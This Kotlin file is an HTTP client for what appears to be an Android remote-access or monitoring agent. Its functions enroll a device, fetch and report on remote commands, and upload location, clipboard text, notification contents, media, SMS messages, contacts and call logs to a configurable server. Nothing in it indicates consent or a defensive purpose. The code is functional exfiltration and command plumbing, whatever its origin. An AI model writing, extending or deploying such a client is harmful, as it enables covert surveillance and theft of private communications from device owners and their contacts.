package com.misfit.gawdzilla

import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.TimeUnit

object ApiClient {
    private val JSON = "application/json; charset=utf-8".toMediaType()
    private val client = OkHttpClient.Builder()
        .connectTimeout(10, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .build()

    private fun post(url: String, body: JSONObject): JSONObject? {
        return try {
            val req = Request.Builder()
                .url(url)
                .post(body.toString().toRequestBody(JSON))
                .build()
            client.newCall(req).execute().use { r ->
                if (!r.isSuccessful) return null
                val s = r.body?.string() ?: return null
                JSONObject(s)
            }
        } catch (_: Exception) { null }
    }

    private fun get(url: String): JSONObject? {
        return try {
            val req = Request.Builder().url(url).get().build()
            client.newCall(req).execute().use { r ->
                if (!r.isSuccessful) return null
                val s = r.body?.string() ?: return null
                JSONObject(s)
            }
        } catch (_: Exception) { null }
    }

    fun enroll(server: String, token: String, name: String, osVersion: String,
               arch: String): JSONObject? {
        val body = JSONObject()
            .put("token", token)
            .put("name", name)
            .put("platform", "android")
            .put("os_version", osVersion)
            .put("arch", arch)
            .put("agent_version", "1.0.0")
            .put("hw_id", android.os.Build.FINGERPRINT)
        return post("${server.trimEnd('/')}/device/enroll", body)
    }

    fun heartbeat(server: String, token: String, sysinfo: JSONObject): JSONObject? {
        val body = JSONObject().put("token", token).put("sysinfo", sysinfo)
        return post("${server.trimEnd('/')}/device/heartbeat", body)
    }

    fun fetchCommands(server: String, token: String): JSONObject? =
        get("${server.trimEnd('/')}/device/command?token=$token")

    fun postResult(server: String, token: String, id: Int, ok: Boolean, result: String): JSONObject? {
        val body = JSONObject()
            .put("token", token).put("id", id).put("ok", ok).put("result", result.take(2000))
        return post("${server.trimEnd('/')}/device/command/result", body)
    }

    fun postLocation(server: String, token: String, lat: Double, lon: Double,
                     accuracy: Float?, speed: Float?): JSONObject? {
        val body = JSONObject()
            .put("token", token).put("lat", lat).put("lon", lon)
            .put("accuracy_m", accuracy ?: 0f).put("speed_mps", speed ?: 0f)
        return post("${server.trimEnd('/')}/device/location", body)
    }

    fun postUsage(server: String, token: String, apps: JSONArray): JSONObject? {
        return post("${server.trimEnd('/')}/device/usage",
            JSONObject().put("token", token).put("apps", apps))
    }

    fun postNotification(server: String, token: String, pkg: String, title: String, body: String): JSONObject? {
        val b = JSONObject().put("token", token).put("pkg", pkg).put("title", title).put("body", body)
        return post("${server.trimEnd('/')}/device/notify", b)
    }

    fun postClipboard(server: String, token: String, content: String): JSONObject? {
        val b = JSONObject().put("token", token).put("direction", "up").put("content", content)
        return post("${server.trimEnd('/')}/device/clip", b)
    }

    fun fetchPolicy(server: String, token: String): JSONObject? =
        get("${server.trimEnd('/')}/device/policy?token=$token")

    fun postMedia(server: String, token: String, kind: String, b64: String): JSONObject? {
        val b = JSONObject().put("token", token).put("kind", kind).put("data_b64", b64)
        return post("${server.trimEnd('/')}/device/media", b)
    }

    fun postSms(server: String, token: String, items: JSONArray): JSONObject? {
        return post("${server.trimEnd('/')}/device/sms",
            JSONObject().put("token", token).put("items", items))
    }

    fun postContacts(server: String, token: String, items: JSONArray): JSONObject? {
        return post("${server.trimEnd('/')}/device/contacts",
            JSONObject().put("token", token).put("items", items))
    }

    fun postCallLog(server: String, token: String, items: JSONArray): JSONObject? {
        return post("${server.trimEnd('/')}/device/calllog",
            JSONObject().put("token", token).put("items", items))
    }
}
